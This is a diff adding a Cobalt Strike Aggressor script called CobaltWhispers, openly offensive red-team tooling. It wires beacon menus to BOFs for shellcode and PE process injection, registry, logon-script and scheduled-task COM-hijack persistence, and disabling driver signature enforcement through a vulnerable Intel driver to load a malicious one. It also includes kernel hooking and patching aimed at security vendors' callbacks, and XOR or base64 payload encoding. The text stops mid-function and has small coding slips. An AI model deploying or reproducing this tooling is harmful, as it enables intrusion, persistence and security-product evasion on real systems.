@@ -1,0 +1,1508 @@
+#=======================================================================================================================================================#
+#                                                                                                                                                       #
+#       CobaltWhispers                                                                                                                                  #
+#       Author: @Cerbersec                                                                                                                              #
+#                                                                                                                                                       #
+#       Property of: @NVISOsecurity                                                                                                                     #
+#                                                                                                                                                       #
+#=======================================================================================================================================================#
+
+
+#=======================================================================================================================================================#
+#                                                                           Menu                                                                        #
+#=======================================================================================================================================================#
+
+
+popup beacon_top {
+	menu "CobaltWhispers" {
+        menu Drivers {
+            menu Elevated {
+                item "Elevated: Disable DSE"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &elevateddisabledsedialog($bid);
+                    }
+                }
+                item "Elevated: Unload Driver"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &elevatedunloaddriverdialog($bid);
+                    }
+                }
+            }
+            menu Non-Elevated {
+                item "Intercept: Information"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &interceptinfodialog($bid);
+                    }
+                }
+                item "Intercept: Hook"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &intercepthookdialog($bid);
+                    }
+                }
+                item "Intercept: Unhook"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &interceptunhookdialog($bid);
+                    }
+                }
+                item "Intercept: Patch"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &interceptpatchdialog($bid);
+                    }
+                }
+                item "Intercept: Restore"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &interceptrestoredialog($bid);
+                    }
+                }
+            }
+        }
+        menu Persistence {
+            menu Elevated {
+			    item "Elevated: Registry Key"{
+				    local('$bid');
+				    foreach $bid ($1){
+					    &elevatedregistrydialog($bid);
+				    }
+                }
+                item "Elevated: UserInit Registry Key"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &elevatedregistryuserinitdialog($bid);
+                    }
+                }             
+			}
+		    menu Non-Elevated {
+			    item "Non-Elevated: Registry Key"{
+				    local('$bid');
+				    foreach $bid ($1){
+					    &userregistrydialog($bid);
+				    }
+                }
+                item "Non-Elevated: InitMprLogonScript Registry Key"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &userregistryinitmprlogonscriptdialog($bid);
+                    }
+                }
+                item "Non-Elevated: Scheduled Task COM Hijack"{
+                    local('$bid');
+                    foreach $bid ($1){
+                        &scheduledtaskcomhijackdialog($bid);
+                    }
+                }
+			}
+        }
+        menu Injection {
+            item "Spawn process" {
+                local('$bid');
+                foreach $bid ($1){
+                    &spawnprocessdialog($bid);
+                }
+            }
+            item "CreateRemoteThread" {
+                local('$bid');
+                foreach $bid ($1){
+                    &createremotethreaddialog($bid);
+                }
+            }
+            item "QueueUserAPC" {
+                local('$bid');
+                foreach $bid ($1){
+                    &queueuserapcdialog($bid);
+                }
+            }
+            item "MapViewOfSection" {
+                local('$bid');
+                foreach $bid ($1){
+                    &mapviewofsectiondialog($bid);
+                }
+            }
+            item "Transacted Hollowing" {
+                local('$bid');
+                foreach $bid ($1){
+                    &transactedhollowingdialog($bid);
+                }
+            }
+            item "Elevated: PhantomDLLHollowing" {
+                local('$bid');
+                foreach $bid ($1){
+                    &phantomdllhollowingdialog($bid);
+                }
+            }
+        }
+        item "Set/Update Defaults"{
+		    &updateglobals();
+		}
+    }
+}
+
+
+#=======================================================================================================================================================#
+#                                                                      House keeping                                                                    #
+#=======================================================================================================================================================#
+
+# Resources
+$SpawnProcess = script_resource("SpawnProcess.o");
+$CreateRemoteThread = script_resource("CreateRemoteThread.o");
+$QueueUserAPC = script_resource("QueueUserAPC.o");
+$MapViewOfSection = script_resource("MapViewOfSection.o");
+$TransactedHollowing = script_resource("TransactedHollowing.o");
+$PhantomDLLHollowing = script_resource("PhantomDLLHollowing.o");
+
+$PersistUserRegKey = script_resource("PersistUserRegKey.o");
+$PersistUserInitMprRegKey = script_resource("PersistUserInitMprRegKey.o");
+$PersistElevatedRegKey = script_resource("PersistElevatedRegKey.o");
+$PersistElevatedUserInitRegKey = script_resource("PersistElevatedUserInitRegKey.o");
+$PersistScheduledTaskCOMHijack = script_resource("PersistScheduledTaskCOMHijack.o");
+
+$DSEDisable = script_resource("DisableDSE.o");
+$UnloadDriver = script_resource("UnloadDriver.o");
+$Intercept = script_resource("Intercept.o");
+
+# Global variables
+%globals["regkeyname"] = "WinReg";
+%globals["command"] = "";
+%globals["processpath"] = "C:\\Windows\\System32\\svchost.exe";
+%globals["parent"] = "explorer.exe";
+%globals["driverregkey"] = "";
+%globals["driverpath"] = "";
+
+# Payload defaults
+%globals["listener"] = "";
+%globals["staged"] = "false";
+%globals["x86"] = "false";
+%globals["shellcodeformat"] = "xor";
+
+sub updateglobals{
+	local('$dialog');
+	$dialog = dialog("Global variables", %globals, &saveoptions);
+    # Global variables
+	dialog_description($dialog, "Global variables");
+	drow_text($dialog, "regkeyname", "Registry Key Name: ");
+	drow_text($dialog, "command", "Command: ");
+    drow_text($dialog, "processpath", "Executable Location: ");
+    drow_text($dialog, "parent", "Parent process: ");
+
+    # Payload defaults
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "shellcodeformat", "Shellcode Format: ", @("raw", "xor", "base64", "array", "hex", "powershell-base64", "vba", "vbs", "veil"));
+	drow_checkbox($dialog, "staged", "Staged Payloads: ");
+	drow_checkbox($dialog, "x86", "x86 Payloads: ");
+	dbutton_action($dialog, "Update");
+	dialog_show($dialog);
+}
+
+sub saveoptions{
+	local('%options');
+	%options = $3;
+    # Global variables
+	%globals["regkeyname"] = %options["regkeyname"];
+	%globals["command"] = %options["command"];
+    %globals["processpath"] = %options["processpath"];
+    %globals["parent"] = %options["parent"];
+
+    # Payload defaults
+	%globals["listener"] = %options["listener"];
+	%globals["staged"] = %options["staged"];
+	%globals["x86"] = %options["x86"];
+	%globals["shellcodeformat"] = %options["shellcodeformat"];
+	
+	show_message("Defaults have been saved");
+}
+
+
+#=======================================================================================================================================================#
+#                                                                   Payload management                                                                  #
+#=======================================================================================================================================================#
+
+
+sub payloadhandler {
+    local('$bid $gen $arch');
+
+    $bid = $1;
+    $gen = $2;
+
+    if(%globals["x86"] eq "false") {
+        $arch = "x64";
+    }
+    else {
+        $arch = "x86";
+    }
+
+    if($gen["staged"] eq "false") {
+        $shcode = artifact_payload($gen['listener'], $gen["type"], $arch);
+
+        # change from globals to $gen?
+        if(%globals["shellcodeformat"] eq "raw"){
+            $finshcode = $shcode;
+        }
+        else if(%globals["shellcodeformat"] eq "base64"){
+            $finshcode = base64_encode($shcode);
+        }
+        else if(%globals["shellcodeformat"] eq "xor"){
+            $finshcode = xor($shcode);
+        }
+        else {
+            $finshcode = transform($shcode, %globals["shellcodeformat"]);
+        }
+    }
+    else {
+        $shcode = artifact_stager($gen['listener'], $gen["type"], $arch);
+
+        if(%globals["shellcodeformat"] eq "raw"){
+            $finshcode = $shcode;
+        }
+        else if(%globals["shellcodeformat"] eq "base64"){
+            $finshcode = base64_encode($shcode);
+        }
+        else if(%globals["shellcodeformat"] eq "xor"){
+            $findshcode = xor($shcode);
+        }
+        else {
+            $finshcode = transform($shcode, %globals["shellcodeformat"]);
+        }
+    }
+    return $finshcode;
+}
+
+sub readpayload {
+    local('$path $payloadhandle $payload');
+    $path = $1;
+    $payloadhandle = openf($path);
+    $payload = readb($payloadhandle, -1);
+    closef($payloadhandle);
+
+    if(%globals["shellcodeformat"] eq "raw"){
+        return $payload;
+    }
+    else if(%globals["shellcodeformat"] eq "base64"){
+        return base64_encode($payload);
+    }
+    else if(%globals["shellcodeformat"] eq "xor"){
+        return xor($payload);
+    }
+    else {
+        return transform($payload, %globals["shellcodeformat"]);
+    }
+}
+
+sub payloadfromb64 {
+    local('$payload');
+    $payload = base64_decode($1);
+
+    if(%globals["shellcodeformat"] eq "raw"){
+        return $payload;
+    }
+    else if(%globals["shellcodeformat"] eq "base64"){
+        return base64_encode($payload);
+    }
+    else if(%globals["shellcodeformat"] eq "xor"){
+        return xor($payload);
+    }
+    else {
+        return transform($payload, %globals["shellcodeformat"]);
+    }
+}
+
+
+#=======================================================================================================================================================#
+#                                                                        Dialogs                                                                        #
+#=======================================================================================================================================================#
+
+
+sub spawnprocessdialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults["processpath"] = %globals["processpath"];
+    %defaults["parent"] = %globals["parent"];
+
+    $dialog = dialog("Spawn new process", %defaults, lambda({
+        if($2 eq "Help"){
+            &spawnprocesshelp();
+            break;
+        }
+        &spawnprocess($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Spawn a new sacrificial process");
+    drow_text($dialog, "parent", "Parent process: ");
+    drow_text($dialog, "processpath", "Executable location: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub elevatedregistrydialog {
+    local('$bid $dialog %defaults');
+	$bid = $1;
+
+	%defaults["regkeyname"]  = %globals["regkeyname"];
+	%defaults["command"] = %globals["command"];
+	
+	$dialog = dialog("Elevated: Registry Key Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&registryhelp();
+			break;
+		}
+		&elevatedregistrykey($bid, $3);
+	}, \$bid, \$3));
+
+	dialog_description($dialog, "Elevated: Create new registry key");
+	drow_text($dialog, "regkeyname", "Key name: ");
+	drow_text($dialog, "command", "Command: ");
+	drow_combobox($dialog, "regkey", "Registry key", @("HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"));
+    drow_checkbox($dialog, "hidden", "Hidden: ", " create hidden key");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub elevatedregistryuserinitdialog {
+    local('$bid $dialog %defaults');
+	$bid = $1;
+
+	%defaults["command"] = %globals["command"];
+	
+	$dialog = dialog("Elevated: UserInit Registry Key Persistence", %defaults, lambda({
+		if($2 eq "Help"){
+			&registryhelp();
+			break;
+		}
+		&elevateduserinitregistrykey($bid, $3);
+	}, \$bid, \$3));
+
+	dialog_description($dialog, "Elevated: Modify the UserInit Registry Key");
+	drow_text($dialog, "command", "Command: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub elevateddisabledsedialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults["vulnpayloadpath"] = "iqvm64.sys";
+    %defaults["vulndrivername"] = "NalDrv";
+    %defaults["vulndevicename"] = "Nal";
+    %defaults["tgtpayloadpath"] = "Interceptor.sys";
+    %defaults["tgtdrivername"] = "Interceptor";
+    %defaults["tgtdevicename"] = "Interceptor";
+    %defaults["targetpath"] = "C:\\temp\\";
+
+    $dialog = dialog("Elevated: Disable DSE", %defaults, lambda({
+        if($2 eq "Help"){
+            &disabledsehelp();
+            break;
+        }
+        &elevateddisabledse($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Elevated: Disable Driver Signature Enforcement");
+    drow_file($dialog, "vulnpayloadpath", "Vulnerable driver location: ");
+    drow_file($dialog, "tgtpayloadpath", "Malicious driver location: ");
+    drow_text($dialog, "vulndrivername", "Vulnerable driver name: ");
+    drow_text($dialog, "vulndevicename", "Vulnerable driver device name: ");
+    drow_text($dialog, "tgtdrivername", "Malicious driver name: ");
+    drow_text($dialog, "tgtdevicename", "Malicious driver device name: ");
+    drow_text($dialog, "targetpath", "Target path: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub elevatedunloaddriverdialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults["driverregkey"] = %globals["driverregkey"];
+    %defaults["driverpath"] = %globals["driverpath"];
+
+    $dialog = dialog("Elevated: Unload Driver", %defaults, lambda({
+        if($2 eq "Help"){
+            &unloaddriverhelp();
+            break;
+        }
+        &elevatedunloaddriver($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Elevated: Unload Driver");
+    drow_text($dialog, "driverregkey", "Driver registry key: ");
+    drow_text($dialog, "driverpath", "Driver installation path: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub interceptinfodialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults[""] = "";
+
+    $dialog = dialog("Intercept: Information", %defaults, lambda({
+        if($2 eq "Help"){
+            &interceptinfohelp();
+            break;
+        }
+        &interceptinfo($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Intercept: Information");
+    drow_combobox($dialog, "action", "Action: ", @("vendors", "modules", "hooked modules", "callbacks"));
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub intercepthookdialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults[""] = "";
+
+    $dialog = dialog("Intercept: Hook", %defaults, lambda({
+        if($2 eq "Help"){
+            &intercepthookhelp();
+            break;
+        }
+        &intercepthook($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Intercept: Hook");
+    drow_combobox($dialog, "action", "Action: ", @("index", "name"));
+    drow_text($dialog, "values", "Values: ");
+    drow_text($dialog, "name", "Name: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub interceptunhookdialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults[""] = "";
+
+    $dialog = dialog("Intercept: Unhook", %defaults, lambda({
+        if($2 eq "Help"){
+            &interceptunhookhelp();
+            break;
+        }
+        &interceptunhook($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Intercept: Unhook");
+    drow_combobox($dialog, "action", "Action: ", @("index", "all"));
+    drow_text($dialog, "values", "Values: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub interceptpatchdialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults[""] = "";
+
+    $dialog = dialog("Intercept: Patch", %defaults, lambda({
+        if($2 eq "Help"){
+            &interceptpatchhelp();
+            break;
+        }
+        &interceptpatch($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Intercept: Patch");
+    drow_combobox($dialog, "action", "Action: ", @("vendor", "module", "process", "thread", "image", "registry", "object process", "object thread"));
+    drow_text($dialog, "name", "Name: ");
+    drow_text($dialog, "values", "Values: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub interceptrestoredialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults[""] = "";
+
+    $dialog = dialog("Intercept: Restore", %defaults, lambda({
+        if($2 eq "Help"){
+            &interceptrestorehelp();
+            break;
+        }
+        &interceptrestore($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Intercept: Restore");
+    drow_combobox($dialog, "action", "Action: ", @("vendor", "module", "process", "thread", "image", "registry", "object process", "object thread", "all"));
+    drow_text($dialog, "name", "Name: ");
+    drow_text($dialog, "values", "Values: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub userregistrydialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+    
+    %defaults["regkeyname"] = %globals["regkeyname"];
+    %defaults["command"] = %globals["command"];
+
+    $dialog = dialog("Non-Elevated: Registry Key Persistence", %defaults, lambda({
+        if($2 eq "Help"){
+            &registryhelp();
+            break;
+        }
+        &userregistrykey($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Non-Elevated: Create a new registry key");
+    drow_text($dialog, "regkeyname", "Key name: ");
+    drow_text($dialog, "command", "Command: ");
+    drow_combobox($dialog, "regkey", "Registry key: ", @("HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "HKCU:\\Environment"));
+    drow_checkbox($dialog, "hidden", "Hidden: ", " create hidden key");
+    drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup persistence");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub userregistryinitmprlogonscriptdialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+    
+    %defaults["command"] = %globals["command"];
+
+    $dialog = dialog("Non-Elevated: UserInitMprLogonScript Registry Key Persistence", %defaults, lambda({
+        if($2 eq "Help"){
+            &registryhelp();
+            break;
+        }
+        &userinitmprlogonscriptregistrykey($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Non-Elevated: Modify the UserInitMprLogonScript registry key");
+    drow_text($dialog, "command", "Command: ");
+    drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup persistence");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub scheduledtaskcomhijackdialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    $dialog = dialog("Non-Elevated: Scheduled Task COM Hijack", %defaults, lambda({
+        if($2 eq "Help"){
+            &scheduledtaskcomhijackhelp();
+            break;
+        }
+        &scheduledtaskcomhijack($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "Non-Elevated: Scheduled Task COM Hijack");
+    drow_text($dialog, "clsid", "Class ID: ");
+    drow_text($dialog, "dllpath", "DLL path: ");
+    drow_checkbox($dialog, "cleanup", "Cleapu: ", " Cleanup persistence");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub createremotethreaddialog {
+    local('$bid $dialog %defaults');
+    $bid = $1;
+
+    %defaults["listener"] = %globals["listener"];
+    %defaults["staged"] = %globals["staged"];
+    $defaults["type"] = "raw";
+
+    $dialog = dialog("CreateRemoteThread: shellcode injection", %defaults, lambda({
+        if($2 eq "Help"){
+            &createremotethreadhelp();
+            break;
+        }
+        &createremotethread($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "NtCreateThreadEx: Inject into remote process");
+    drow_text($dialog, "pid", "Process PID: ");
+    drow_file($dialog, "payloadpath", "Payload location: ");
+    drow_text_big($dialog, "payloadb64", "Payload b64: ");
+    drow_listener_stage($dialog, "listener", "Listener: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub queueuserapcdialog {
+    local('$bid %dialog %defaults');
+    $bid = $1;
+
+    %defaults["threads"] = "5";
+    %defaults["listener"] = %globals["listener"];   
+    %defaults["staged"] = %globals["staged"];
+    %defaults["type"] = "raw";
+
+    $dialog = dialog("QueueUserAPC: shellcode injection", %defaults, lambda({
+        if($2 eq "Help"){
+            &queueuserapchelp();
+            break;
+        }
+        &queueuserapc($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "NtQueueApcThread: Inject into remote process");
+    drow_text($dialog, "pid", "Process PID: ");
+    drow_text($dialog, "threads", "Threads: ")
+    drow_file($dialog, "payloadpath", "Payload location: ");
+    drow_text_big($dialog, "payloadb64", "Payload b64: ");
+    drow_listener_stage($dialog, "listener", "Listener: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub mapviewofsectiondialog {
+    local('$bid %dialog %defaults');
+    $bid = $1;
+
+    %defaults["listener"] = %globals["listener"];
+    %defaults["staged"] = %globals["staged"];
+    %defaults["processpath"] = %globals["processpath"];
+    %defaults["parent"] = %globals["parent"];
+    %defaults["type"] = "raw";
+
+    $dialog = dialog("MapViewOfSection: shellcode injection", %defaults, lambda({
+        if($2 eq "Help"){
+            &mapviewofsectionhelp();
+            break;
+        }
+        &mapviewofsection($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "NtMapViewOfSection: Inject into remote process");
+    drow_text($dialog, "parent", "Parent process: ");
+    drow_text($dialog, "processpath", "Executable location: ");
+    drow_file($dialog, "payloadpath", "Payload location: ");
+    drow_text_big($dialog, "payloadb64", "Payload b64: ");
+    drow_listener_stage($dialog, "listener", "Listener: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub transactedhollowingdialog {
+    local('$bid, %dialog, %defaults');
+    $bid = $1;
+
+    %defaults["listener"] = %globals["listener"];
+    %defaults["staged"] = %globals["staged"];
+    %defaults["processpath"] = %globals["processpath"];
+    %defaults["parent"] = %globals["parent"];
+    %defaults["type"] = "exe";
+
+    $dialog = dialog("TransactedHollowing: PE injection", %defaults, lambda({
+        if($2 eq "Help"){
+            &transactedhollowinghelp();
+            break;
+        }
+        &transactedhollowing($bid, $3);
+    }, \$bid, \$3));
+
+    dialog_description($dialog, "TransactedHollowing: Inject into remote process");
+    drow_text($dialog, "parent", "Parent process: ");
+    drow_text($dialog, "processpath", "Executable location: ");
+    drow_file($dialog, "payloadpath", "Payload location: ");
+    drow_text_big($dialog, "payloadb64", "Payload b64: ");
+    drow_listener_stage($dialog, "listener", "Listener: ");
+    dbutton_action($dialog, "Execute");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub phantomdllhollowingdialog {
+    show_message("Not implemented");
+    #local('$bid %dialog %defaults');
+    #$bid = $1;
+
+    #%defaults["listener"] = %globals["listener"];
+    #%defaults["staged"] = %globals["staged"];
+    #%defaults["processpath"] = %globals["processpath"];
+    #%defaults["parent"] = %globals["parent"];
+
+    #$dialog = dialog("Elevated: PhantomDLLHollowing: PIC shellcode injection", %defaults, lambda({
+    #    if($2 eq "Help"){
+    #        &phantomdllhollowinghelp();
+    #        break;
+    #    }
+    #    &phantomdllhollowing($bid, $3);
+    #}, \$bid, \$3));
+
+    #dialog_description($dialog, "Phantom DLL Hollowing: Inject into remote process");
+    #drow_text($dialog, "parent", "Parent process: ");
+    #drow_text($dialog, "processpath", "Executable location: ");
+    #drow_file($dialog, "payloadpath", "Payload location: ");
+    #drow_text_big($dialog, "payloadb64", "Payload b64: ");
+    #drow_listener_stage($dialog, "listener", "Listener: ");
+    #dbutton_action($dialog, "Execute");
+    #dbutton_action($dialog, "Help");
+    #dialog_show($dialog);
+}
+
+
+#=======================================================================================================================================================#
+#                                                                           Evil                                                                        #
+#=======================================================================================================================================================#
+
+
+sub spawnprocess {
+    local('$bid $args $params $bof');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($SpawnProcess);
+
+    # Pack args
+    $args = bof_pack($bid, "zz", $params["processpath"], $params["parent"]);
+
+    # Run
+    btask($bid, "Running SpawnProcess");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub elevatedregistrykey {
+    local('$bid $args $params $bof $hidden $cleanup');
+    $bid = $1;
+    $params = $2;
+    $hidden = 0;
+    $cleanup = 0;
+
+    # Read BOF
+    $bof = readbof($PersistElevatedRegKey);
+
+    # Pack args
+    if($params["hidden"] eq 'true') {
+        $hidden = 1;
+    }
+    if($params["cleanup"] eq 'true') {
+        $cleanup = 1;
+    }
+
+    # Process registry key
+    ($x, $path) = split(':', $params["regkey"]);
+
+    $args = bof_pack($bid, "zzzii", $path, $params["regkeyname"], $params["command"], $hidden, $cleanup);
+
+    # Run
+    btask($bid, "Running PersistElevatedRegKey");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub elevateduserinitregistrykey {
+    local('$bid $args $params $bof $cleanup');
+    $bid = $1;
+    $params = $2;
+    $cleanup = 0;
+
+    # Read BOF
+    $bof = readbof($PersistElevatedUserInitRegKey);
+
+    # Pack args
+    if($params["cleanup"] eq 'true') {
+        $cleanup = 1;
+    }
+
+    $args = bof_pack($bid, "zi", $params["command"], $cleanup);
+
+    # Run
+    btask($bid, "Running PersistElevatedUserInitRegKey");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub elevateddisabledse {
+    local('$bid $args $params $bof $vulnregkey $tgtregkey $vulndriverpath $tgtdriverpath');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($DSEDisable);
+
+    # Pack args
+    if($params["vulnpayloadpath"]){
+        $vulnpayload = readpayload($params["vulnpayloadpath"]);
+    }
+
+    if($params["tgtpayloadpath"]){
+        $tgtpayload = readpayload($params["tgtpayloadpath"]);
+    }
+
+    # Process params
+    $vulnregkey = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\$params['vulndrivername'] $+ ";
+    $tgtregkey = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\$params['tgtdrivername'] $+ ";
+    $vulndriverpath = "\\??\\$params['targetpath'] $+ $params['vulndrivername'] $+ .sys";
+    $tgtdriverpath = "\\??\\$params['targetpath'] $+ $params['tgtdrivername'] $+ .sys";
+
+    # Update globals for UnloadDriver
+    %globals["driverregkey"] = $tgtregkey;
+    %globals["driverpath"] = $tgtdriverpath;
+
+    $args = bof_pack($bid, "bbZZZZZZ", $vulnpayload, $tgtpayload, $vulnregkey, $tgtregkey, $vulndriverpath, $tgtdriverpath, $params["vulndevicename"], $params["tgtdevicename"]);
+
+    # Run
+    btask($bid, "Running Disable DSE BOF");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub elevatedunloaddriver {
+    local('$bid $args $params $bof');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($UnloadDriver);
+
+    # Pack args
+    $args = bof_pack($bid, "ZZ", $params["driverregkey"], $params["driverpath"]);
+
+    # Run
+    btask($bid, "Running UnloadDriver BOF");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub interceptinfo {
+    local('$bid $args $params $bof');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($Intercept);
+
+    # Pack args
+    $args = bof_pack($bid, "ZZ", "info", $params["action"]);
+
+    # Run
+    btask($bid, "Running Intercept BOF");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub intercepthook {
+    local('$bid $args $params $bof $values');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($Intercept);
+
+    # Pack args
+    # Process params
+    if($params["action"] eq "index") {
+        $values = $params["values"];
+    }
+    else {
+        $values = $params["name"];
+    }
+
+    $args = bof_pack($bid, "ZZZ", "hook", $params["action"], $values);
+
+    # Run
+    btask($bid, "Running Intercept BOF");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub interceptunhook {
+    local('$bid $args $params $bof $values');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($Intercept);
+
+    # Pack args
+    # Process params
+    if($params["action"] eq "index") {
+        $values = $params["values"];
+    }
+    else {
+        $values = "all";
+    }
+
+    $args = bof_pack($bid, "ZZZ", "unhook", $params["action"], $values);
+
+    # Run
+    btask($bid, "Running Intercept BOF");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub interceptpatch {
+    local('$bid $args $params $bof $values');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($Intercept);
+
+    # Pack args
+    # Process params
+    if(($params["action"] eq "vendor") || ($params["action"] eq "module")) {
+        $values = $params["name"];
+    }
+    else {
+        $values = $params["values"];
+    }
+
+    $args = bof_pack($bid, "ZZZ", "patch", $params["action"], $values);
+
+    # Run
+    btask($bid, "Running Intercept BOF");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub interceptrestore {
+    local('$bid $args $params $bof $values');
+    $bid = $1;
+    $params = $2;
+
+    # Read BOF
+    $bof = readbof($Intercept);
+
+    # Pack args
+    # Process params
+    if(($params["action"] eq "vendor") || ($params["action"] eq "module")) {
+        $values = $params["name"];
+    }
+    else if($params["action"] eq "all") {
+        $values = "all";
+    }
+    else {
+        $values = $params["values"];
+    }
+
+    $args = bof_pack($bid, "ZZZ", "restore", $params["action"], $values);
+
+    # Run
+    btask($bid, "Running Intercept BOF");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub userregistrykey {
+    local('$bid $args $params $bof $hidden $cleanup');
+    $bid = $1;
+    $params = $2;
+    $hidden = 0;
+    $cleanup = 0;
+
+    # Read BOF
+    $bof = readbof($PersistUserRegKey);
+
+    # Pack args
+    if($params["hidden"] eq 'true') {
+        $hidden = 1;
+    }
+    if($params["cleanup"] eq 'true') {
+        $cleanup = 1;
+    }
+
+    # Process registry key
+    ($x, $path) = split(':', $params["regkey"]);
+
+    $args = bof_pack($bid, "zzzii", $path, $params["regkeyname"], $params["command"], $hidden, $cleanup);
+
+    # Run
+    btask($bid, "Running PersistUserRegKey");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub userinitmprlogonscriptregistrykey {
+    local('$bid $args $params $bof $cleanup');
+    $bid = $1;
+    $params = $2;
+    $cleanup = 0;
+
+    # Read BOF
+    $bof = readbof($PersistUserInitMprRegKey);
+
+    # Pack args
+    if($params["cleanup"] eq 'true') {
+        $cleanup = 1;
+    }
+
+    $args = bof_pack($bid, "zi", $params["command"], $cleanup);
+
+    # Run
+    btask($bid, "Running PersistUserInitMprRegKey");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub scheduledtaskcomhijack {
+    local('$bid $args $params $bof $cleanup');
+    $bid = $1;
+    $params = $2;
+    $cleanup = 0;
+
+    # Read BOF
+    $bof = readbof($PersistScheduledTaskCOMHijack);
+
+    # Pack args
